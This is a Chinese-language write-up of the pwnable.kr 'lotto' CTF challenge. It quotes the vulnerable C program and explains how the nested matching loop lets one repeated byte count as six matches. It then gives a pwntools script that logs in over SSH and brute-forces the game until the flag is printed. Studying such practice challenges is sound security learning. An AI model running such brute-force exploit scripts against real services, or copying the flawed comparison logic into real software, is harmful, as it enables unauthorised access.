---
title: kr_lotto
date: 2020-01-26 22:30:25
tags:
- pwn
- pwnable.kr
---

# pwnable.kr lotto

### 0x1 分析

看一下c文件吧。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

	int i;
	printf("Submit your 6 lotto bytes : ");
	fflush(stdout);

	int r;
	r = read(0, submit, 6);

	printf("Lotto Start!\n");
	//sleep(1);

	// generate lotto numbers
	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1){
		printf("error. tell admin\n");
		exit(-1);
	}
	unsigned char lotto[6];
	if(read(fd, lotto, 6) != 6){
		printf("error2. tell admin\n");
		exit(-1);
	}
	for(i=0; i<6; i++){
		lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45
	}
	close(fd);

	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

	// win!
	if(match == 6){
		system("/bin/cat flag");
	}
	else{
		printf("bad luck...\n");
	}

}

void help(){
	printf("- nLotto Rule -\n");
	printf("nlotto is consisted with 6 random natural numbers less than 46\n");
	printf("your goal is to match lotto numbers as many as you can\n");
	printf("if you win lottery for *1st place*, you will get reward\n");
	printf("for more details, follow the link below\n");
	printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
	printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

	// menu
	unsigned int menu;

	while(1){

		printf("- Select Menu -\n");
		printf("1. Play Lotto\n");
		printf("2. Help\n");
		printf("3. Exit\n");

		scanf("%d", &menu);

		switch(menu){
			case 1:
				play();
				break;
			case 2:
				help();
				break;
			case 3:
				printf("bye\n");
				return 0;
			default:
				printf("invalid menu\n");
				break;
		}
	}
	return 0;
}
```

看起来重点在这里：

```c
// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

	// win!
	if(match == 6){
		system("/bin/cat flag");
	}
	else{
		printf("bad luck...\n");
	}
```

之前一直以为有什么漏洞可以利用，但是。发现实力有限。找不到。🤷‍♂️

那就得在这里做文章。但是。貌似看了别人的writeup。只能由爆破这个路子。

那就爆破吧。只要匹配$1-45$ 范围`6`次就行了。那就随便找一个好了。

| [二进制](https://zh.wikipedia.org/wiki/二进制) | [十进制](https://zh.wikipedia.org/wiki/十进制) | [十六进制](https://zh.wikipedia.org/wiki/十六进制) |  [图形](https://zh.wikipedia.org/wiki/图形)   |
| :--------------------------------------------: | :--------------------------------------------: | :------------------------------------------------: | :-------------------------------------------: |
|                   0010 0000                    |     [32](https://zh.wikipedia.org/wiki/32)     |                         20                         | ([space](https://zh.wikipedia.org/wiki/空格)) |
|                   0010 0001                    |     [33](https://zh.wikipedia.org/wiki/33)     |                         21                         |   [!](https://zh.wikipedia.org/wiki/惊叹号)   |
|                   0010 0010                    |     [34](https://zh.wikipedia.org/wiki/34)     |                         22                         |   ["](https://zh.wikipedia.org/wiki/双引号)   |
|                   0010 0011                    |     [35](https://zh.wikipedia.org/wiki/35)     |                         23                         |    [#](https://zh.wikipedia.org/wiki/井號)    |
|                   0010 0100                    |     [36](https://zh.wikipedia.org/wiki/36)     |                         24                         |     [$](https://zh.wikipedia.org/wiki/$)      |
|                   0010 0101                    |     [37](https://zh.wikipedia.org/wiki/37)     |                         25                         |   [%](https://zh.wikipedia.org/wiki/百分比)   |
|                   0010 0110                    |     [38](https://zh.wikipedia.org/wiki/38)     |                         26                         |    [&](https://zh.wikipedia.org/wiki/%26)     |
|                   0010 0111                    |     [39](https://zh.wikipedia.org/wiki/39)     |                         27                         |   ['](https://zh.wikipedia.org/wiki/单引号)   |
|                   0010 1000                    |     [40](https://zh.wikipedia.org/wiki/40)     |                         28                         |    [(](https://zh.wikipedia.org/wiki/括號)    |
|                   0010 1001                    |     [41](https://zh.wikipedia.org/wiki/41)     |                         29                         |    [)](https://zh.wikipedia.org/wiki/括號)    |
|                   0010 1010                    |     [42](https://zh.wikipedia.org/wiki/42)     |                         2A                         |    [*](https://zh.wikipedia.org/wiki/星号)    |
|                   0010 1011                    |     [43](https://zh.wikipedia.org/wiki/43)     |                         2B                         |    [+](https://zh.wikipedia.org/wiki/加号)    |
|                   0010 1100                    |     [44](https://zh.wikipedia.org/wiki/44)     |                         2C                         |    [,](https://zh.wikipedia.org/wiki/逗号)    |
|                   0010 1101                    |     [45](https://zh.wikipedia.org/wiki/45)     |                         2D                         |    [-](https://zh.wikipedia.org/wiki/减号)    |

这是可视范围内的字符。（不可视范围也可以。）

随缘构造字符串`payload = '------'`。开始爆破。

### 0x2 EXP

```python
from pwn import *

context.log_level = 'debug'
s = ssh(host='pwnable.kr', user='lotto', password='guest', port=2222)
r = s.process('/home/lotto/lotto')
payload = '------'

r.sendlineafter("3. Exit\n", '1')
r.sendlineafter("Submit your 6 lotto bytes : ", payload)
str = r.recv()
print str
if  "bad luck...\n" in str:
	while 1:
		r.sendlineafter("3. Exit\n", '1')
		r.sendlineafter("Submit your 6 lotto bytes : ", payload)
		str = r.recv()
		if "bad luck...\n" in str:
			print str
		else :
		 	print str
			break
```



